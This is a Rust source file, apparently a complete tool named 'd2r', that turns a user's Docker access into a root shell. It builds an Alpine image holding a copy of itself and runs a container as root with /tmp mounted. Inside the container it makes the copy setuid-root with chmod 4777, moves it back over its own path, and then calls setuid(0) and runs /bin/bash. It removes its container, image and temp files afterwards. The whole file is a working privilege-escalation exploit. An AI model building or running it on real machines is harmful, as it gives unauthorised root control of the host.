use std::env;
use std::fs;
use std::os::linux::fs::MetadataExt;
use std::process::Command;

use libc::c_int;

macro_rules! vs {
    ($($x:expr),*) => (vec![$($x.to_string()),*]);
}
macro_rules! s {
    ($($x:expr),*) => ($($x.to_string()),*);
}


const TMP_DIR: &str = "/tmp/d2r";
const DOCKERFILE_CONTENT: &str = "FROM alpine:3.5\nCOPY r.sh r.sh\nCOPY rs rs\n";
const RSH_CONTENT: &str = "#!/bin/sh\n\ncp -f rs /tmp/rs2\nchmod 4777 /tmp/rs2\n";

fn main() {
    let mut args = get_args();
    let is_check = is_result_check(&mut args);
    let self_path = get_exe_path();
    let is_suid = get_suid_bit(&self_path);

    if is_suid {
        println!("> running shell (suid)");
        escalate();
        exec(&s!("/bin/bash"), &args, &s!("run bash"));
    } else if !is_check {
        println!("> running script (no suid)");
        setup_files();
        docker_run();
        cleanup(&self_path);
        check_result(&self_path);
    } else {
        println!("> check failed: no suid bit {}", &self_path);
        std::process::exit(1);
    }
}

fn escalate() {
    let result: c_int;
    unsafe { result = libc::setuid(0); }
    if result == -1 {
        println!("cannot set uuid 0");
        std::process::exit(1);
    }
    unsafe { libc::setgid(0); }
}

fn check_result(path1: &String) {
    println!("checking result...");
    exec(&path1, &vs!["d2r-check"], &s!("run result suid executable"));
}

fn cleanup(self_path: &String) {
    println!("cleanup...");
    exec(&s!("docker"), &vs!["rm", "-f", "d2r"], &s!("remove docker container"));
    exec(&s!("docker"), &vs!["rmi", "-f", "d2r:latest"], &s!("remove docker image"));
    exec(&s!("/tmp/rs2"), &vs!["d2r-check", "-v", "-c", format!("rm -rf {TMP_DIR}")], &s!("remove tmp folder"));
    exec(&s!("/tmp/rs2"), &vs!["d2r-check", "-v", "-c", format!("mv -f /tmp/rs2 {self_path}")], &s!("move suid executable"));
}

fn docker_run() {
    println!("docker run...");
    exec(&s!("docker"), &vs!["build", "--rm", "-t", "d2r", TMP_DIR], &s!("build docker image"));
    exec(&s!("docker"), &vs!["run", "--name", "d2r", "-v", "/tmp:/tmp", "d2r:latest", "/bin/sh", "r.sh"], &s!("start docker container"));
}

fn get_suid_bit(path: &str) -> bool {
    fs::metadata(path)
        .map(|metadata| metadata.st_mode() & 0o4000 != 0)
        .unwrap_or_else(|err| {
            eprintln!("Error getting metadata: {} {}", path, err);
            std::process::exit(1);
        })
}

fn get_exe_path() -> String {
    env::current_exe()
        .map(|exe| exe.to_string_lossy().into_owned())
        .unwrap_or_else(|err| {
            eprintln!("Error getting current executable: {}", err);
            std::process::exit(1);
        })
}

fn get_args() -> Vec<String> {
    let mut args: Vec<String> = env::args().skip(1).collect();
    args.shrink_to_fit();
    args
}

fn is_result_check(args: &mut Vec<String>) -> bool {
    if let Some(arg1) = args.get(0) {
        if arg1 == "d2r-check" {
            args.remove(0);
            return true;
        }
    }
    false
}

fn exec(program: &String, program_args: &Vec<String>, program_desc: &String) {
    Command::new(program)
        .args(program_args)
        .status()
        .unwrap_or_else(|err| {
            eprintln!("Cannot {} : failed to exec {} {}: {}", program_desc, program, program_args.join(", "), err);
            std::process::exit(1);
        })
        .success()
        .then(|| ())
        .ok_or(s!("bad exit code"))
        .unwrap_or_else(|err| {
            eprintln!("Cannot {} : failed to exec {} {}: {}", program_desc, program, program_args.join(", "), err);
            std::process::exit(1);
        });
}

fn setup_files() {
    println!("extracting files to {}...", TMP_DIR);
    fs::create_dir_all(TMP_DIR).unwrap_or_else(|err| {
        eprintln!("Unable to create dir {}: {}", TMP_DIR, err);
        std::process::exit(1);
    });
    fs::copy(&get_exe_path(), format!("{}/rs", TMP_DIR)).unwrap_or_else(|err| {
        eprintln!("Unable to copy file to {}/rs: {}", TMP_DIR, err);
        std::process::exit(1);
    });
    fs::write(format!("{}/Dockerfile", TMP_DIR), DOCKERFILE_CONTENT).unwrap_or_else(|err| {
        eprintln!("Unable to write Dockerfile: {}", err);
        std::process::exit(1);
    });
    fs::write(format!("{}/r.sh", TMP_DIR), RSH_CONTENT).unwrap_or_else(|err| {
        eprintln!("Unable to write r.sh: {}", err);
        std::process::exit(1);
    });
}
